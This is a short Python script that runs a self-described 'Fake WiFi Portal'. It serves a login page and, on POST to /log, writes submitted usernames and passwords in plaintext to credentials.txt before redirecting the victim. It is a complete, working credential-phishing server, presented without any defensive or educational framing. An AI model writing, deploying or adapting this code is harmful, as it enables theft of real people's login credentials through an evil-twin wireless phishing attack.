from http.server import BaseHTTPRequestHandler, HTTPServer
import urllib.parse

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/":
            with open("index.html", "rb") as f:
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(f.read())

    def do_POST(self):
        if self.path == "/log":
            length = int(self.headers['Content-Length'])
            data = self.rfile.read(length).decode()
            parsed = urllib.parse.parse_qs(data)
            user = parsed.get('user', [''])[0]
            passwd = parsed.get('pass', [''])[0]
            with open("credentials.txt", "a") as f:
                f.write(f"User: {user}, Pass: {passwd}\n")
            self.send_response(302)
            self.send_header('Location', '/')
            self.end_headers()

server = HTTPServer(('0.0.0.0', 8000), Handler)
print("🚀 Fake WiFi Portal running on http://localhost:8000")
server.serve_forever()
